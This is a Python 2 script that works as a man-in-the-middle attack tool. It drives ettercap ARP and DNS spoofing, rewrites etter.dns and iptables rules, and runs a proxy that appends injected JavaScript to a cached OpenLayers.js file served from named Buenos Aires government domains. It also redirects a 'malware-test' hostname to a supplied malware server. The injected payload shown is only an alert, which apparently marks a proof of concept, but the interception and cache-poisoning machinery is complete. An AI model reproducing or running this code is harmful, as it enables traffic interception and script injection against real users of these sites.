from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os
import uuid
import threading
import argparse
import re
import base64
import urlparse
import urllib2
import SocketServer
import SimpleHTTPServer
import urllib
import netifaces
from subprocess import Popen, call, PIPE
from shlex import split
import fileinput
import sys
import time
import os
import traceback

domain1 = 'epok.buenosaires.gob.ar' #IP is 200.16.89.103
domain2 = 'servicios.usig.buenosaires.gov.ar' # Poisoned path: /OpenLayers/2.13-dev1-1/OpenLayers.js
                                            # IP is 200.16.89.28    

targetJSURL = 'http://servicios.usig.buenosaires.gov.ar/OpenLayers/2.13-dev1-1/OpenLayers.js'

searchForceGetPoisonedJavascript = '''
var request = new XMLHttpRequest();
request.open("GET", "http://servicios.usig.buenosaires.gov.ar/OpenLayers/2.13-dev1-1/OpenLayers.js", true);
request.setRequestHeader("Cache-Control","no-cache")
request.onreadystatechange = function() {
  if (request.readyState == 4) {
      if (request.status == 200 || request.status == 0) {
          // -> request.responseText <- is a result
      }
  }
}
request.send();
'''

serverCacheOriginalJavascriptToPoison = ''

addedJavascript = '''alert("Vulnerabilidad encontrada"); '''#

def sendModifiedSearch(request):
    request.send_response(200)
    request.send_header("Content-type", "text/javascript")
    request.end_headers()
    with open('javascript.js', 'rb') as inyectedJavascript:
        request.wfile.write(inyectedJavascript.read())
    #request.wfile.write(searchForceGetPoisonedJavascript)
    request.wfile.close()

#sends the javascript that's executed every time the app begins, it's saved in the cache
def sendPoisonedJS(request):
    request.send_response(200)
    request.send_header("Content-type", "text/javascript")
    request.end_headers()
    request.wfile.write(urllib2.urlopen(targetJSURL).read()+addedJavascript)
    request.wfile.close()

def isASearchRequest(path):
    return '/buscar/' in path

def isTargetJSRequest(path):
    return "/OpenLayers/2.13-dev1-1/OpenLayers.js" in path

class BAComoLLegoHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

        def do_GET(self):
                try:
                    print self.headers['Host']
                    if isASearchRequest(self.path) and not os.path.exists('firstRun'):
                        print " response"
                        file = open('firstRun', 'w+')
                        file.close()
                        sendModifiedSearch(self)
                    else:
                        #not called since service.using not being spoofed via dns
                        if isTargetJSRequest(self.path):
                            print "JS response"
                            sendPoisonedJS(self)
                        else:
                            print "OTHER response"
                            #fix search not working
                            if 'mapa.buenosaires.gob.ar' in self.headers['Host'] and \
                            '/2.0/consultar_recorridos' in self.path:
                                print "Changing search response"
                                site = "http://recorridos.usig.buenosaires.gob.ar/2.0/consultar_gba?"+self.path.split('?',1)[1]
                                req = urllib2.Request(site, None, self.headers)
                            else:
                                #content = urllib2.urlopen("http://"+self.headers['Host']+self.path).read()
                                req = urllib2.Request("http://"+self.headers['Host']+self.path, None, self.headers)
                            response = urllib2.urlopen(req)
                            content = response.read()                            
                            self.send_response(200)
                            for header in response.info().headers:
                                key, value = header.strip().split(':',1)
                                self.send_header(key,value)
                            self.end_headers()                            
                            #print response
                            #print content
                            self.wfile.write(content)
                except Exception, err:
                        print traceback.print_exc()
                        pass

def replaceAll(file,searchExp,replaceExp):
    for line in fileinput.input(file, inplace=1):
        if searchExp in line:
            line = line.replace(searchExp,replaceExp)
        sys.stdout.write(line)

def run(target,gateway,malware_server_address):
    #Configuration of /usr/share/ettercap/etter.dns etter.conf
    #On ubuntu 13.04 /etc/ettercap/etter.dns etter.conf
    input_stdin = Popen(split("echo pdns_spoof"), stdout=PIPE)
    ettercap = Popen(split('ettercap -i wlan0 -T -q -P autoadd -M ARP:remote /'''+target+'/ /'+gateway+'/'), stdin=input_stdin.stdout)
    #ip_forward after ettercap may have set it to zero
    #ADD DNS etter.conf TO SERVER IN VIRTUALBOX, VIRTUALBOX INTERNAL NETWORK
    vbox0_address = netifaces.ifaddresses('vboxnet0')[netifaces.AF_INET][0]['addr']
    replaceAll('/etc/ettercap/etter.dns','*.buenosaires.gob.ar A IP','*.buenosaires.gob.ar A '+vbox0_address )
    replaceAll('/etc/ettercap/etter.dns','malware-test.no-ip.info A IP','malware-test.no-ip.info A '+malware_server_address)
    #getOriginalJStoPoison()
    server_address = ('0.0.0.0', 80)
    SocketServer.ForkingTCPServer.allow_reuse_address = True
    httpd = SocketServer.ForkingTCPServer(server_address, BAComoLLegoHTTPRequestHandler)
    #wait for ettercap to initialize and unset ip_forward
    time.sleep(5)
    Popen(split("iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE"), stdout=PIPE).wait()
    Popen(split("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE"), stdout=PIPE).wait()
    Popen(split("sysctl -w net.ipv4.ip_forward=1"), stdout=PIPE).wait()
    #Popen(split("sysctl -p /etc/sysctl.conf"), stdout=PIPE).wait()
    try:
        print('http server is running...')
        httpd.serve_forever()   
    except KeyboardInterrupt:
        print "Exiting"
        if os.path.exists('firstRun'):
            print "removing first run flag"
            os.remove('firstRun')
        replaceAll('/etc/ettercap/etter.dns','*.buenosaires.gob.ar A '+vbox0_address,'*.buenosaires.gob.ar A IP' )
        replaceAll('/etc/ettercap/etter.dns','malware-test.no-ip.info A '+malware_server_address,'malware-test.no-ip.info A IP')
        Popen(split("sudo iptables -t nat -D POSTROUTING -o wlan0 -j MASQUERADE"), stdout=PIPE)
        Popen(split("sudo iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE"), stdout=PIPE)
        ettercap.terminate()

      
if __name__ == '__main__':
    run(sys.argv[1],sys.argv[2],sys.argv[3]) 
